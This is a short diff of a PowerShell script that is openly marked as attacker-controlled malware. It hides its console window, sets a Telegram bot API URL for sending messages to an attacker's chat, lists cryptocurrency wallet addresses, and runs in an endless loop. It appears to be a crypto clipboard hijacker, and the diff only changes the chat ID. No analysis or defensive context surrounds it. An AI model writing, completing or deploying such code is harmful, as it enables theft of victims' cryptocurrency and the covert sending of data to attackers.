@@ -17,7 +17,7 @@ if ($hwnd -ne [IntPtr]::Zero) { [Console.Window]::ShowWindow($hwnd, 0) | Out-Nul
 #   CONFIGURATION - ATTACKER CONTROL SECTION (Telegram Edition)
 # ═══════════════════════════════════════════════════════════════════════════════
 
-$telegram_base = "https://api.telegram.org/bot0000000000:AAGRDjUqixqTmLDCKHD5_hbLCED6OzyEYpo/sendMessage?chat_id=5600000000&text="  # ← Replace with your real bot token and chat_id
+$telegram_base = "https://api.telegram.org/bot0000000000:AAGRDjUqixqTmLDCKHD5_hbLCED6OzyEYpo/sendMessage?chat_id=5600000001&text="  # ← Replace with your real bot token and chat_id
 
 $wallets = @{
     "BTC_LEGACY"   = @("1LuckyR1fFHEsXYzdJ3t4qGKBf2f4x5v6","1BoatSLRHtKNngkdXEeobR76b53LETtpyT")
@@ -173,3 +173,4 @@ while ($true) {
     Start-Sleep -Milliseconds (Get-Random -Minimum 320 -Maximum 680)
 
 }
+
